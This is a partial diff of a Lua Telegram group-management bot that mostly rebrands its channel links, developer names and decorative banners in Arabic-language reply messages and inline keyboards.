+if text == '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺' and DevSoFi(msg) then
 local Text = [[ 
-[قناه سورس السيزر ادخل وتابع الجديد](t.me/surccesezr)
+[قناه سورس السيزر ادخل وتابع الجديد](t.me/A_F_fwdka1)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'معلومات الكيبورد' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-[CH](t.me/surccesezr)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
+[CH](t.me/A_F_fwdka1)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
 1• الاحصائيات { لعرض عدد المجموعات، والمشتركين في البوت
  2• تفعيل التواصل{ لتفعيل التواصل عبر البوت خاص بك} 
  3• تعطيل التواصل{ لتعطيل التواصل عبر البوت خاص بك } 
@@ -1514,7 +1519,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'قناة السورس', url="t.me/surccesezr"}}, 
+{{text = 'قناة السورس', url="t.me/A_F_fwdka1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1531,25 +1536,25 @@ end
 if text == 'عموري مبرمج السورس' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-المبرمج سيزر لو حابب تتواصل معاه
+المبرمج عموري لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⇈⇊
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐅𝐀𝐑𝐍𝐂𝐄 ༆',url="t.me/BOT3mora"}},
+{{text = '𝐅𝐀𝐑𝐍𝐂𝐄 ༆',url="t.me/s_e_z_r0"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text == 'سيزر مبرمج السورس²' and DevSoFi(msg) then
+if text == 'عمري مبرمج السورس²' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-مبرمج سيزر لو حابب تتواصل معاه
+مبرمج عمري لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⇈⇊
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = ' 𝐒𝐄𝐙𝐑 ༆',url="t.me/s_e_z_r0"}},
+{{text = ' 𝐉𝐀𝐁𝐖𝐀 ༆',url="t.me/J_A_B_W_A"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1562,7 +1567,7 @@ return false
 end
 if text == ("الثانوين") and SudoBot(msg) then
 local list = database:smembers(bot_id.."Dev:SoFi:2")
-t = "\n 🌕 قائمة مطورين الثانويين للبوت \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة مطورين الثانويين للبوت \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -1601,7 +1606,7 @@ return false
 end
 if text == ("المطورين") and SudoBot(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
-t = "\n 🌕 قائمة المطورين \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المطورين \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -1617,7 +1622,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("قائمه العام") and SudoBot(msg) then
 local list = database:smembers(bot_id..'GBan:User')
-t = "\n 🌕 قائمه المحظورين عام \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمه المحظورين عام \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -1634,7 +1639,7 @@ return false
 end
 if text == ("قائمه الكتم العام") and SudoBot(msg) then
 local list = database:smembers(bot_id..'Gmute:User')
-t = "\n 🌕 قائمة المكتومين عام \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المكتومين عام \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -2169,7 +2174,7 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 if data.username_ ~= false then
 send(msg.chat_id_,0," 🌕 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 🌕 ["..DRAGON_Msg.."] \n")
 else
-send(msg.chat_id_,0," 🌕 الـعـضو  : {["..data.first_name_.."](t.me/surccesezr)}\n 🌕 ["..DRAGON_Msg.."] \n")
+send(msg.chat_id_,0," 🌕 الـعـضو  : {["..data.first_name_.."](T.ME/A_F_fwdka1)}\n 🌕 ["..DRAGON_Msg.."] \n")
 end
 end,nil)   
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
@@ -2696,7 +2701,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0, " 🌕 عذرا  ⇇{[@"..data.username_.."]}\n 🌕 عذرا تم منع الملصق \n" ) 
 else
-send(msg.chat_id_,0, " 🌕 عذرا  ⇇{["..data.first_name_.."](t.me/surccesezr)}\n 🌕 عذرا تم منع الملصق \n" ) 
+send(msg.chat_id_,0, " 🌕 عذرا  ⇇{["..data.first_name_.."](T.ME/A_F_fwdka1)}\n 🌕 عذرا تم منع الملصق \n" ) 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -2716,7 +2721,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0," 🌕 عذرا  ⇇{[@"..data.username_.."]}\n 🌕 عذرا تم منع الصوره \n" ) 
 else
-send(msg.chat_id_,0," 🌕 عذرا  ⇇{["..data.first_name_.."](t.me/surccesezr)}\n 🌕 عذرا تم منع الصوره \n") 
+send(msg.chat_id_,0," 🌕 عذرا  ⇇{["..data.first_name_.."](T.ME/A_F_fwdka1)}\n 🌕 عذرا تم منع الصوره \n") 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -2733,7 +2738,7 @@ tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data
 if data.username_ ~= false then
 send(msg.chat_id_,0," 🌕 عذرا  ⇇{[@"..data.username_.."]}\n 🌕 عذرا تم منع المتحركه \n") 
 else
-send(msg.chat_id_,0," 🌕 عذرا  ⇇{["..data.first_name_.."](t.me/surccesezr)}\n 🌕 عذرا تم منع المتحركه \n" ) 
+send(msg.chat_id_,0," 🌕 عذرا  ⇇{["..data.first_name_.."](T.ME/A_F_fwdka1)}\n 🌕 عذرا تم منع المتحركه \n" ) 
 end
 end,nil)   
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
@@ -3053,7 +3058,7 @@ send(msg.chat_id_, msg.id_, texts)
 end
 if text == "الاسماء المكتومه" and Constructor(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 local All_name = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_)
-t = "\n 🌕 قائمة الاسماء المكتومه \n𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة الاسماء المكتومه \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ \n"
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
 end
@@ -3271,37 +3276,37 @@ local Text = [[
  🌕 معني + اسمك ⤌ لعرض الميزه
  🌕 خلفيات ⤌ لعرض الميزه
  ─────── 🌕 ───────
-𓆩 𝗖𝗛 - [ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗩𝗢𝗗𝗧𝗞𝗔 ](t.me/surccesezr)𓆪
+𓆩 𝗖𝗛 - [ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗩𝗢𝗗𝗧𝗞𝗔 ](t.me/A_F_fwdka1)𓆪
  ─────── 🌕 ───────
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/406/903&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/406/903&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'سيزر' then
 local Text = [[
 
-╭▱▰▱▰𓆩[𝐕𝐎𝐃𝐓𝐊𝐀](http://t.me/surccesezr)𓆪▱▰▱▰╮
+╭▱▰▱▰𓆩[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](http://t.me/A_F_fwdka1)𓆪▱▰▱▰╮
 ┆
-┆[▸ 𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙾𝙳𝚃𝙺𝙰 ◂](http://t.me/surccesezr)
+┆[𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](http://t.me/A_F_fwdka1)
 ┆
-╰▱▰▱▰𓆩[𝐕𝐎𝐃𝐓𝐊𝐀](http://t.me/surccesezr)𓆪▱▰▱▰╯
+╰▱▰▱▰𓆩[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](http://t.me/A_F_fwdka1)𓆪▱▰▱▰╯
 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝐅𝐀𝐑𝐍𝐂𝐄',url="t.me/BOT3mora"},{text = '3𝐌𝐎𝐑𝐀', url="t.me/XxDesha86Xx"}},
-{{text = '𝐒𝐄𝐙𝐑',url="t.me/s_e_z_r0"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑',url="t.me/surccesezr"}},
-{{text = 'أضغط لاضافه ألبوت لمجموعتك ??' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
+{{text = '𝐃𝐄𝐕 𝐒𝐄𝐙𝐑',url="t.me/s_e_z_r0"},{text = '𝐃𝐄𝐕 3𝐌𝐎𝐑𝐀', url="t.me/alknas11"}},
+{{text = '𝐃𝐄𝐕 𝐃𝐄𝐒𝐇𝐀',url="t.me/XxDesha86Xx"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑',url="t.me/A_F_fwdka1"}},
+{{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_MOSTAFA/50&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
@@ -3311,18 +3316,18 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝐅𝐀𝐑𝐍𝐂𝐄',url="t.me/BOT3mora"},{text = '𝐁𝐎𝐓 𝐅𝐀𝐑𝐍𝐂𝐄', url="t.me/Bot_JABWA_Bot"}},
-{{text = '3𝐌𝐎𝐑𝐀',url="t.me/XxDesha86Xx"},{text = '𝐁𝐎𝐓 3𝐌𝐎𝐑𝐀', url="t.me/vodika_55_bot"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐃𝐄𝐕 𝐒𝐄𝐙𝐑',url="t.me/s_e_z_r0"},{text = '𝐁𝐎𝐓 𝐒𝐄𝐙𝐑', url="t.me/sezrrbot"}},
+{{text = '𝐃𝐄𝐕 𝐃𝐄𝐒𝐇𝐀',url="t.me/XxDesha86Xx"},{text = '𝐁𝐎𝐓 𝐃𝐄𝐒𝐇𝐀', url="t.me/vodika_55_bot"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'سيزر' or text == 'المبرمج سيزر' or text == 'مين عملك السورس' or text == 'مبرمح السورس²' then
+if text == 'سيزر' or text == 'المبرمج سيزر' or text == 'صاحب السورس' or text == 'مبرمح السورس' then
 local Text = [[
-سيزر مبرمج السورس² لو حابب تتواصل معاه
+سيزر مبرمج السورس لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⇈⇊
 ]]
 keyboard = {} 
@@ -3333,9 +3338,9 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/s_e_z_r0&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == 'المبرمج سيزر' or text == 'مبرمج السورس' or text == 'عموري' or text == 'صاحب السورس' then
+if text == 'المبرمج عموري' or text == 'مبرمج السورس' or text == 'عموري' or text == 'صاحب السورس' then
 local Text = [[
-عموري مبرمج السورس لو حابب تتواصل معاه
+عموري مبرمج السورس² لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⇈⇊
 ]]
 keyboard = {} 
@@ -3346,20 +3351,20 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BOT3mora&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == 'المالك قناص' or text == 'ديشا' or text == 'قناص' or text == 'مالك السورس' then
+if text == 'المالك ديشا' or text == 'مصطفي' or text == 'ديشا' or text == 'مالك السورس' then
 local Text = [[
-قناص مالك السورس لو حابب تتواصل معاه
+ديشا مالك السورس لو حابب تتواصل معاه
 اتبع الزر إلى تحت ⇈⇊
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝐃𝐄𝐕 3𝐌𝐎𝐑𝐀',url="https://t.me/sezr_su"}},
+{{text = '𝐃𝐄𝐕 𝐃𝐄𝐒𝐇𝐀',url="t.me/XxDesha86Xx"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/XxDesha86Xx&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == '𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘' or text == 'عاوز بوت' then
+if text == '⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺' or text == 'عاوز بوت' then
 local Text = [[ 
 من أحسن السورسات على التليجرام سورس السيزر
 بجد سورس أمان جدا وفي مميزات جامده
@@ -3368,11 +3373,11 @@ local Text = [[
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'مبرمج السورس', url="t.me/BOT3mora"}}, 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = 'مبرمج السورس', url="t.me/s_e_z_r0"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'قناة السورس' or text == 'قناه السورس' or text == 'قناة البرمجه' or text == 'قناة سورس سيزر' then
 local Text = [[
@@ -3383,10 +3388,10 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'يوتيوب' or text == 'بحث' or text == 'اليوتيوب' then
 local Text = [[
@@ -3410,20 +3415,20 @@ local Text = [[
 𖣘 𝐓𝐇𝐄 𝐋𝐈𝐒𝐓 𝐎𝐅 𝐍𝐎𝐕𝐄𝐋𝐒 𖣘
 ]]
 keyboard = {} keyboard.inline_keyboard = {
-{{text = '📖رواية "أرض زيكولا"',url="https://t.me/surccesezr"}},
+{{text = '📖رواية "أرض زيكولا"',url="https://t.me/A_F_fwdka1"}},
 {{text = '📖موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
-{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/surccesezr"}},
-{{text = '📖رواية "المخلوق', url="https://t.me/surccesezr"}},
-{{text = '📖رواية "بعد النسيان"', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/surccesezr"}},
-{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖رواية"جثة في الفندق"', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖رواية "في القطار السريع"', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖لقاء مع كاتب رعب"', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖رواية"الإنسان الأخير""', url="https://t.me/t.me/surccesezr"}},
-{{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/surccesezr"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/A_F_fwdka1"}},
+{{text = '📖رواية "المخلوق', url="https://t.me/A_F_fwdka1"}},
+{{text = '📖رواية "بعد النسيان"', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖رواية"جثة في الفندق"', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖رواية "في القطار السريع"', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖لقاء مع كاتب رعب"', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖رواية"الإنسان الأخير""', url="https://t.me/t.me/A_F_fwdka1"}},
+{{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/A_F_fwdka1"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5  
@@ -3442,7 +3447,7 @@ return false
 end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200
 },function(ta,DRAGON)
-local t = "\n☆ "..ttag.." \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+local t = "\n☆ "..ttag.." \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 x = 0
 local list = DRAGON.members_
 for k, v in pairs(list) do
@@ -3462,10 +3467,10 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'سيزر مبرمج السورس',url="t.me/s_e_z_r0"}},
-{{text = 'عموري مبرمج السورس',url="t.me/BOT3mora"}},
-{{text = 'ديشا مالك السورس',url="t.me/XxDesha86Xx"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = 'عمري مبرمج السورس',url="t.me/J_A_B_W_A"}},
+{{text = 'عموري مبرمج السورس',url="t.me/s_e_z_r0"}},
+{{text = 'الديشا مالك السورس',url="t.me/alknas11"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3483,7 +3488,7 @@ return false
 end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
 },function(ta,DRAGON)
-local t = "\nツ قائمة الاعضاء \n𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+local t = "\nツ قائمة الاعضاء \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ \n"
 x = 0
 local list = DRAGON.members_
 for k, v in pairs(list) do
@@ -3499,7 +3504,7 @@ ght = math.random(2,22);
 local Text ='تم اختيار فديو استوري  لك 🌚💘' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑',url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑',url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},  
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3510,7 +3515,7 @@ ght = math.random(1,62);
 local Text ='تم اختيار هذه الصوره لـك 🌚💘' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑',url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑',url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3521,7 +3526,7 @@ ght = math.random(1,62);
 local Text = 'تـم اخـتيار هـذه الـصوره لـك 🌚💘'
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3532,7 +3537,7 @@ ght = math.random(1,62);
